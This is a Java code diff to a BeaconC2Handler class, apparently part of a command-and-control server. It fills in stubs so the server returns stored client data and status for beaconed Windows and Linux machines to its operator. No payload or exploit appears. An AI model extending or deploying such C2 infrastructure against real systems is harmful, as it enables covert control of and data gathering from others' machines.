@@ -70,33 +70,26 @@ public class BeaconC2Handler implements Runnable{
                         }
                     }
                 }else if(tokens[0].equals("Request")){
+                    String responseToRequest = "";
                     if(tokens[1].equals("ClientData")){
                         if(tokens[2].equals("Windows")){
                             if(tokens[3].equals("All")){
-                                // TODO
+                                responseToRequest = beaconServer.getMultipleClientResponses("Windows").toString();
                             }else{
-                                // TODO
+                                responseToRequest = beaconServer.getSingleClientResponses(tokens[3]).toString();
                             }
                         }else if(tokens[2].equals("Linux")){
                             if(tokens[3].equals("All")){
-                                // TODO
+                                responseToRequest = beaconServer.getMultipleClientResponses("Linux").toString();
                             }
                             else{
-                                // TODO
+                                responseToRequest = beaconServer.getSingleClientResponses(tokens[3]).toString();
                             }
                         }
                     }else if(tokens[1].equals("ClientStatus")){
-                        if(tokens[2].equals("All")){
-                            // TOOD
-                        }else if(tokens[2].equals("Windows")){
-                            // TODO
-                        }else if(tokens[2].equals("Linux")){
-                            // TODO
-                        }else{
-                            // TODO
-                        }
-
+                        responseToRequest = beaconServer.getClientStatus(tokens[2]).toString();
                     }
+                    C2Server.send(responseToRequest);
                 }
                 
             } catch(IOException e){
